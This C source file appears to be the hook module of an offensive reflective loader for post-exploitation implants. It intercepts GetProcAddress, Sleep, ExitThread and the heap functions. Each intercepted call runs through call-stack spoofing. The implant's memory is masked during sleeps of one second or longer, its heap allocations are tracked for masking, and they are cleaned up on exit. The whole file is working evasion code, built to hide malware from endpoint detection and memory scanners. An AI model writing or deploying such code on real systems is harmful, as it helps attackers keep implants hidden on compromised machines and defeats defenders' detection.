#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "spoof.h"
#include "cleanup.h"
#include "tcg.h"

MEMORY_LAYOUT g_memory;

DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep       ( DWORD );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$ExitThread  ( DWORD );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc   ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree    ( HANDLE, DWORD, LPVOID );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc ( HANDLE, DWORD, LPVOID, SIZE_T );

FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if 
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }
    
    return GetProcAddress ( hModule, lpProcName );
}

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        g_memory = * layout;
    }
}

/* 
 * throw these hooks in here because
 * sharing a global across multiple
 * modules is still a bit of a headache
 */

VOID WINAPI _Sleep ( DWORD dwMilliseconds )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( dwMilliseconds );

    /*
     * for performance reasons, only mask
     * memory if sleep time is equal to
     * or greater than 1 second 
     */

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, TRUE );
    }

    spoof_call ( &call );

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, FALSE );
    }
}

VOID WINAPI _ExitThread ( DWORD dwExitCode )
{
    /* free memory */
    cleanup_memory ( &g_memory );

    /* call the real exit thread */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
    call.argc = 1;
    
    call.args [ 0 ]  = spoof_arg ( dwExitCode );

    spoof_call ( &call );
}

LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
{
    LPVOID result = NULL;

    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapAlloc );
    call.argc = 3;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( dwBytes );

    result = ( LPVOID ) spoof_call ( &call );

    /* store a record of this heap allocation */

    if ( dwBytes >= 256 && result != NULL && g_memory.Heap.Count < MAX_HEAP_RECORDS )
    {
        g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
        g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
        g_memory.Heap.Count++;
    }

    return result;
}

LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapReAlloc );
    call.argc = 4;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );
    call.args [ 3 ] = spoof_arg ( dwBytes );

    LPVOID result = ( LPVOID ) spoof_call ( &call );

    if ( result )
    {
        BOOL found = FALSE;

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                g_memory.Heap.Records [ i ].Address = result;
                g_memory.Heap.Records [ i ].Size    = dwBytes;
                found = TRUE;
                break;
            }
        }

        if ( !found && dwBytes >= 256 && g_memory.Heap.Count < MAX_HEAP_RECORDS )
        {
            g_memory.Heap.Records [ g_memory.Heap.Count ].Address = result;
            g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = dwBytes;
            g_memory.Heap.Count++;
        }
    }

    return result;
}


BOOL WINAPI _HeapFree ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapFree );
    call.argc = 3;
    
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );

    BOOL result = ( BOOL ) spoof_call ( &call );

    if ( result )
    {
        /* remove the right heap record */

        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == lpMem )
            {
                int last = g_memory.Heap.Count - 1;
                g_memory.Heap.Records [ i ] = g_memory.Heap.Records [ last ];
                g_memory.Heap.Records [ last ].Address = NULL;
                g_memory.Heap.Records [ last ].Size    = 0;
                g_memory.Heap.Count--;
                break;
            }
        }
    }

    return result;
}